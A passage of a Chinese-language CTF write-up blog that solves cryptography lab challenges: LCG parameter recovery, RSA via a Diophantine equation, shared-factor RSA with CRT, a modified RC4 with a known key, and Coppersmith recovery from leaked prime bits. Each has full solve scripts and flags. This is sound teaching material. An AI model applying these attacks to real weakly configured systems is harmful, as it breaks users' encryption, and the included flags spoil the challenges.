class="hljs-number">295614965</span>]<br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">15</span>,<span class="hljs-number">2</span>**<span class="hljs-number">16</span>):<br><span class="hljs-keyword">if</span> a&amp;<span class="hljs-number">1</span>==<span class="hljs-number">0</span>:<br><span class="hljs-keyword">continue</span><br><span class="hljs-comment">#print(a)</span><br><span class="hljs-keyword">if</span> flag==<span class="hljs-number">1</span>:<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">15</span>,<span class="hljs-number">2</span>**<span class="hljs-number">16</span>):<br><span class="hljs-keyword">if</span> b&amp;<span class="hljs-number">1</span>==<span class="hljs-number">0</span>:<br><span class="hljs-keyword">continue</span><br>x1=a*xx[<span class="hljs-number">0</span>]+b-xx[<span class="hljs-number">1</span>]<br>x2=a*xx[<span class="hljs-number">1</span>]+b-xx[<span class="hljs-number">2</span>]<br>x3=a*xx[<span class="hljs-number">2</span>]+b-xx[<span class="hljs-number">3</span>]<br>n=s3gcd(x1,x2,x3)<br><span class="hljs-keyword">if</span> n:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n:&#x27;</span>)<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;a:&#x27;</span>)<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;b:&#x27;</span>)<br><span class="hljs-built_in">print</span>(b)<br>flag=<span class="hljs-number">1</span><br><span class="hljs-keyword">break</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n:</span><br><span class="hljs-string">4929631834</span><br><span class="hljs-string">a:</span><br><span class="hljs-string">38219</span><br><span class="hljs-string">b:</span><br><span class="hljs-string">51853</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>exp2(已知密钥密文求明文):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode,b64decode<br><br>n=<span class="hljs-number">4929631834</span>//<span class="hljs-number">2</span><br>a=<span class="hljs-number">38219</span><br>b=<span class="hljs-number">51853</span><br>status=<span class="hljs-number">295614965</span><br>status = (a*status +b) %n<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stream_key</span>():<br>    <span class="hljs-keyword">global</span> status<br>    status = (a*status +b) %n<br>    tk=[]<br>    tmp=status<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        tk.append(tmp&amp;<span class="hljs-number">0xff</span>)<br>        tmp&gt;&gt;=<span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> tk<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encry</span>(<span class="hljs-params">m</span>):<br>    xxx=<span class="hljs-string">b&#x27;&#x27;</span><br>    rk=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>        rk.extend(stream_key())<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(m)):<br>        <span class="hljs-comment">#print(rk[i])</span><br>        <span class="hljs-comment">#print(long_to_bytes(m[i]^rk[i]))</span><br>        xxx+=long_to_bytes(m[i]^rk[i])<br>    <span class="hljs-keyword">return</span>  xxx<br>flag=<span class="hljs-string">b&#x27;R/TOdy+8Glz/ub5d5eDWHq82FXIkfo8bUYs9YwsxLlcW1Sk2eOVIZBY3&#x27;</span><br>flag=b64decode(flag)<br><span class="hljs-comment">#print(flag)</span><br>enc=encry(flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your flag is:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(enc))<br><span class="hljs-comment">#flag&#123;f2235aa7-de3a-4fc0-8b4a-78b3a308b4d1&#125;</span><br></code></pre></td></tr></table></figure><h2 id="5-factor2"><a href="#5-factor2" class="headerlink" title="5.factor2"></a>5.factor2</h2><p>描述：Lab3 factor系列挑战2-EzDiophantine</p><p>提示：<a href="https://docs.sympy.org/latest/modules/solvers/diophantine.html">https://docs.sympy.org/latest/modules/solvers/diophantine.html</a></p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br>e = <span class="hljs-number">65537</span><br>m = bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p * q<br>r1 = getPrime(<span class="hljs-number">10</span>)<br>r2 = getPrime(<span class="hljs-number">10</span>)<br>z = (p - r1)**<span class="hljs-number">2</span> + (q - r2)**<span class="hljs-number">2</span><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;r1=<span class="hljs-subst">&#123;r1&#125;</span> ,r2=<span class="hljs-subst">&#123;r2&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;z=&#x27;</span>,z)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>,c)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">r1=907,r2=653</span><br><span class="hljs-string">z= 213535389621597102184740244886202630435242684582531730773326932996624093041311126514459397101493558109610673403751492075895173220149772618611351905910839508645723509764194761173755989544240338745839972079507046782567404433626252661502761571346272020509124004565064573666665095944013152787435237370724839606212</span><br><span class="hljs-string">c= 59283289247000622498081504665846176344103707182714945648759852796490452360099929188408593715947515102316114856246678378551577101821908858771691800986772323127778323247438754537758975922374566070542341922578149663721340172974688824899145360942684086925172051915031174797963552541224033668126045797673741020690</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>题目是基本的RSA,不同的是给出了一组p,q的二次方程，但是与lab3factor相比没有给出n,故不能用z3解方程解决了，提示了可以用sympy模块解二次方程，解出p,q即可。不过解出来的肯定是多组整数解，取都是正数的解即可，如果还有多组可以都试一下，也可以看解出的p,q的长度，都要达到512bit</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sympy.abc <span class="hljs-keyword">import</span> p,q,t<br><span class="hljs-keyword">from</span> sympy.solvers.diophantine.diophantine <span class="hljs-keyword">import</span> diop_quadratic<br>res=diop_quadratic((p - <span class="hljs-number">907</span>)**<span class="hljs-number">2</span> + (q - <span class="hljs-number">653</span>)**<span class="hljs-number">2</span>-<span class="hljs-number">213535389621597102184740244886202630435242684582531730773326932996624093041311126514459397101493558109610673403751492075895173220149772618611351905910839508645723509764194761173755989544240338745839972079507046782567404433626252661502761571346272020509124004565064573666665095944013152787435237370724839606212</span>, t)<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br>e=<span class="hljs-number">65537</span><br>p=<span class="hljs-number">12618012428840152404965712818920508389051417956089999861660389576276200364274509388379195558285062245803298733724262372917191914895662312507511383583607001</span><br>q=<span class="hljs-number">7370288458889010134092986627449388797518214651196560110252154284932962216018374359481780701627052780212917169408749668183096503232658485577449582198890029</span><br><span class="hljs-comment">#p=14250141398376043939196649899075136582039810180250322562643182012165527363877515706556901968486717224132382701938795958247325918479953884065277951045626607</span><br><span class="hljs-comment">#q=3235561736064751580707946024390997375280954349990409267762413447346667150357425020098257795782860168445904449931931252013423694152453170964440944628439717</span><br><span class="hljs-comment">#print(len(bin(q)))</span><br>c=<span class="hljs-number">59283289247000622498081504665846176344103707182714945648759852796490452360099929188408593715947515102316114856246678378551577101821908858771691800986772323127778323247438754537758975922374566070542341922578149663721340172974688824899145360942684086925172051915031174797963552541224033668126045797673741020690</span><br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>n=p*q<br>d=gp.invert(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="6-mediumRSA"><a href="#6-mediumRSA" class="headerlink" title="6.mediumRSA"></a>6.mediumRSA</h2><p>描述：越位的痛T.T</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br>m=bytes_to_long(flag)<br>e1=getPrime(<span class="hljs-number">16</span>)<br>e2=getPrime(<span class="hljs-number">16</span>)<br>q1=getPrime(<span class="hljs-number">256</span>)<br>q2=getPrime(<span class="hljs-number">256</span>)<br>p=<span class="hljs-number">145761754843820286365615274695640462761297014274071268462997502840493581759068851634614</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e1=<span class="hljs-subst">&#123;e1&#125;</span>,e2=<span class="hljs-subst">&#123;e2&#125;</span>&#x27;</span>)<br>n1=p*q1<br>n2=p*q2<br>c1=<span class="hljs-built_in">pow</span>(m,e1,n1)<br>c2=<span class="hljs-built_in">pow</span>(m,e2,n2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c1=&#x27;</span>,c1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c2=&#x27;</span>,c2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n1=&#x27;</span>,n1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n2=&#x27;</span>,n2)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">e1=58169,e2=42239</span><br><span class="hljs-string">c1= 3692766036283943540313098286304266510361347054708449055542682692062073711536589405245241980174280061301491545039062178654512803574650276066141843678772940052974701</span><br><span class="hljs-string">c2= 4373393412365268398260265778309120474718099194920969619404064575346090988834876519040940374935708519313863690656260819783978176441771230081801993603349968832253841</span><br><span class="hljs-string">n1= 9759279324467394597831711179718508596171969739950295636856128025950371638938763801180107390878866914987308475151240906371719577893672311903919490118982067214334274</span><br><span class="hljs-string">n2= 9362045778153069747981245933168456546468217717807806351786212097034735112184049936432161182243085684425770148036861181126308293616916494342533801458613562708886078</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><p>思路：</p><p>这道题的特点就是，两个n有公因子p,但p不是一个素数，而且因子正好包含e1,e2。当时想了好多种思路，写出来结果不对劲，比如尝试共模攻击,但解出来的m不对，最后想到公因子p可能导致信息缺失了，既然如此，把它拆分成模p,模q,再利用中国剩余定理合起来，把共模攻击得到的结果也当成一个式子，两两一组求中国剩余定理，没想到成功了。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime,long_to_bytes<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br>e1=<span class="hljs-number">58169</span><br>e2=<span class="hljs-number">42239</span><br>c1= <span class="hljs-number">3692766036283943540313098286304266510361347054708449055542682692062073711536589405245241980174280061301491545039062178654512803574650276066141843678772940052974701</span><br>c2= <span class="hljs-number">4373393412365268398260265778309120474718099194920969619404064575346090988834876519040940374935708519313863690656260819783978176441771230081801993603349968832253841</span><br>n = <span class="hljs-number">145761754843820286365615274695640462761297014274071268462997502840493581759068851634614</span><br>p_1=<span class="hljs-number">59325084105703052924591608131999057040970985451532745996619380611443126855843</span><br>p_2=<span class="hljs-number">58169</span><br>p_3=<span class="hljs-number">42239</span><br>phi=(p_2-<span class="hljs-number">1</span>)*(p_1-<span class="hljs-number">1</span>)*(p_3-<span class="hljs-number">1</span>)<br>x,s1, s2 = gmpy2.gcdext(e1, e2)<br><span class="hljs-comment">#print(x)</span><br>m1 = <span class="hljs-built_in">pow</span>(c1, s1, n) * <span class="hljs-built_in">pow</span>(c2, s2, n) % n<br><span class="hljs-comment">#m1=gmpy2.iroot(m1,x)[0]</span><br><span class="hljs-comment">#print(long_to_bytes(m1))</span><br>n1= <span class="hljs-number">9759279324467394597831711179718508596171969739950295636856128025950371638938763801180107390878866914987308475151240906371719577893672311903919490118982067214334274</span><br>n2= <span class="hljs-number">9362045778153069747981245933168456546468217717807806351786212097034735112184049936432161182243085684425770148036861181126308293616916494342533801458613562708886078</span><br>q1=n1//n<br>q2=n2//n<br>cc1=c1%q1<br>cc2=c2%q2<br>d1=gmpy2.invert(e1,q1-<span class="hljs-number">1</span>)<br>d2=gmpy2.invert(e2,q2-<span class="hljs-number">1</span>)<br>m2=<span class="hljs-built_in">pow</span>(cc1,d1,q1)<br>m3=<span class="hljs-built_in">pow</span>(cc2,d2,q2)<br>res1,mod1=crt([n,q1],[m1,m2])<br>res2,mod2=crt([q1,q2],[m2,m3])<br>res3,mod3=crt([n,q2],[m1,m3])<br><span class="hljs-built_in">print</span>(long_to_bytes(res1))<br><span class="hljs-built_in">print</span>(long_to_bytes(res2))<br><span class="hljs-built_in">print</span>(long_to_bytes(res3))<br><span class="hljs-comment">#flag&#123;c9bb7035-36ca-4dc8-923c-34ad6229051c_Lionel_Messi_Come_On&#125;</span><br></code></pre></td></tr></table></figure><h2 id="7-RCFour"><a href="#7-RCFour" class="headerlink" title="7.RCFour"></a>7.RCFour</h2><p>描述：RC Ⅳ</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br>f= <span class="hljs-keyword">lambda</span> x : (x&gt;&gt;<span class="hljs-number">3</span>|x&lt;&lt;<span class="hljs-number">5</span>)&amp;<span class="hljs-number">0xff</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">m,key</span>):<br>    s=[]<br>    t=[]<br>    out=[] <span class="hljs-comment">#putput</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        s.append(<span class="hljs-number">255</span>-i)<span class="hljs-comment">#s[]=[255,254,...,0]</span><br>        t.append(<span class="hljs-built_in">ord</span>(key[i%<span class="hljs-built_in">len</span>(key)]))<br><br>    j=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j=(j+s[i]+t[i])%<span class="hljs-number">256</span><br>        s[i],s[j]=s[j],s[i]<br><br>    i,j=<span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(m)):<br>        i=(i+<span class="hljs-number">1</span>)%<span class="hljs-number">256</span><br>        j=(j+s[i])%<span class="hljs-number">256</span><br><br>        s[i],s[j]=s[i],s[j]<br><br>        index=(s[i]+s[j])%<span class="hljs-number">256</span><br>        out.append(f(s[index]^m[p]))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out).<span class="hljs-built_in">hex</span>()<br>key=<span class="hljs-string">&quot;StreamCipherRCFour&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>)<br>enc=encrypt(flag,key)<br><span class="hljs-built_in">print</span>(enc)<br><span class="hljs-comment">#3baf815ae9aa87513ceb82474a80ac13bca64f723d594622fcdaf7fef08987da278c676eb8cb17b655c0</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>已知密钥的流密码其实很简单，解密密钥的生成和加密一样，这里的不同是加了一步f(s[index]^m[p])，将每个字节的加密结果(8bit)将低位的3个bit移到前面高位5个bit移到后面。所以解密的话，就是将密文的每个字节的低位五个bit移到前面高位三个bit移到后面，再异或上密钥就能得到明文</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>f= <span class="hljs-keyword">lambda</span> x : (x&lt;&lt;<span class="hljs-number">3</span>|x&gt;&gt;<span class="hljs-number">5</span>)&amp;<span class="hljs-number">0xff</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">m,key</span>):<br>    s=[]<br>    t=[]<br>    out=[] <span class="hljs-comment">#putput</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        s.append(<span class="hljs-number">255</span>-i)<span class="hljs-comment">#s[]=[255,254,...,0]</span><br>        t.append(<span class="hljs-built_in">ord</span>(key[i%<span class="hljs-built_in">len</span>(key)]))<br>    j=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j=(j+s[i]+t[i])%<span class="hljs-number">256</span><br>        s[i],s[j]=s[j],s[i]<br><br>    i,j=<span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(m)):<br>        i=(i+<span class="hljs-number">1</span>)%<span class="hljs-number">256</span><br>        j=(j+s[i])%<span class="hljs-number">256</span><br><br>        s[i],s[j]=s[i],s[j]<br><br>        index=(s[i]+s[j])%<span class="hljs-number">256</span><br>        out.append(s[index]^f(m[p]))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br>key=<span class="hljs-string">&quot;StreamCipherRCFour&quot;</span><br>enc=<span class="hljs-number">0x3baf815ae9aa87513ceb82474a80ac13bca64f723d594622fcdaf7fef08987da278c676eb8cb17b655c0</span><br>enc=<span class="hljs-built_in">int</span>(enc).to_bytes(<span class="hljs-number">42</span>,byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br>res=decrypt(enc,key)<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure><h2 id="8-Leak-P"><a href="#8-Leak-P" class="headerlink" title="8.Leak P"></a>8.Leak P</h2><p>描述：知己知彼，百战不殆，Leak系列对于素因子的泄露</p><p>提示：在Lab3-Msg Leak的基础上了解coppersmith攻破此题</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br>m=bytes_to_long(flag)<br>e=<span class="hljs-number">65537</span><br>p=getPrime(<span class="hljs-number">256</span>)<br>leak_p=p&gt;&gt;<span class="hljs-number">120</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;leak_p=&#x27;</span>,leak_p)<br>q=getPrime(<span class="hljs-number">256</span>)<br>n=p*q<br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n=&#x27;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>,c)<br><span class="hljs-comment"># leak_p= 57303545022436031674172379509633863887077</span><br><span class="hljs-comment"># n= 6290400850108673527783456723558868077251853788073859360516042680251422818079380463161520548743184302018140978345372703177688378631564416901363981788817257</span><br><span class="hljs-comment"># c= 3018879496435827891565409624549580574355607699876796814908055868300197064252462047054251836059387617618529706009316747223510404878163964048672091931778452</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>p的高位泄露，思路跟lab3-Msg Leak一样，都是利用sagemath求解，只不过这里已知p的位数太少,需要爆破一定的位数，看能否解出结果。</p><p>计算爆破需要的位数要用到coppersmith定理,可以参考(<a href="https://blog.csdn.net/qq_51999772/article/details/123620932)写的很清晰">https://blog.csdn.net/qq_51999772/article/details/123620932)写的很清晰</a></p><p>exp1(计算解出256位的p未知位数不能超过的位数):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">n= <span class="hljs-number">6290400850108673527783456723558868077251853788073859360516042680251422818079380463161520548743184302018140978345372703177688378631564416901363981788817257</span><br><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-built_in">print</span>(gmpy2.iroot(n**(<span class="hljs-number">49</span>**<span class="hljs-number">2</span>),<span class="hljs-number">100</span>**<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>].bit_length())<br><span class="hljs-built_in">print</span>(gmpy2.iroot(n**(<span class="hljs-number">48</span>**<span class="hljs-number">2</span>),<span class="hljs-number">100</span>**<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>].bit_length())<br><span class="hljs-built_in">print</span>(gmpy2.iroot(n**(<span class="hljs-number">47</span>**<span class="hljs-number">2</span>),<span class="hljs-number">100</span>**<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>].bit_length())<br><span class="hljs-built_in">print</span>(gmpy2.iroot(n**(<span class="hljs-number">46</span>**<span class="hljs-number">2</span>),<span class="hljs-number">100</span>**<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>].bit_length())<br></code></pre></td></tr></table></figure><p>exp2(利用sage求p):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">n = <span class="hljs-number">6290400850108673527783456723558868077251853788073859360516042680251422818079380463161520548743184302018140978345372703177688378631564416901363981788817257</span><br>pbits=<span class="hljs-number">256</span><br><span class="hljs-comment">#kbits = 120</span><br>PR.&lt;x&gt; = PolynomialRing(Zmod(n))<span class="hljs-comment">#生成一个以x为符号的一元多项式环</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">11</span>):<br>p0 = <span class="hljs-number">57303545022436031674172379509633863887077</span><span class="hljs-comment"># 已知的p的高位</span><br>p0=p0&lt;&lt;<span class="hljs-number">11</span><br>p0=p0+i<br>kbits=pbits - p0.nbits()<br>p0=p0&lt;&lt;kbits<br><span class="hljs-comment">#print(p0)</span><br>f = x + p0<br>root = f.small_roots(X=<span class="hljs-number">2</span>^kbits, beta=<span class="hljs-number">0.3</span>) <span class="hljs-comment"># beta=0.3表明存在factor 大于n ^0.3</span><br><span class="hljs-keyword">if</span> root:<br>p=root[<span class="hljs-number">0</span>] + p0<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p=&#x27;</span>,p)<br><span class="hljs-comment">#p= 76169476301543338459784631236092619077954299832985654878386750436147105898219</span><br></code></pre></td></tr></table></figure><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202212030050156.png" alt="image-20221203005059100"></p><p>exp3(已知p解密):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><br>e=<span class="hljs-number">65537</span><br>n= <span 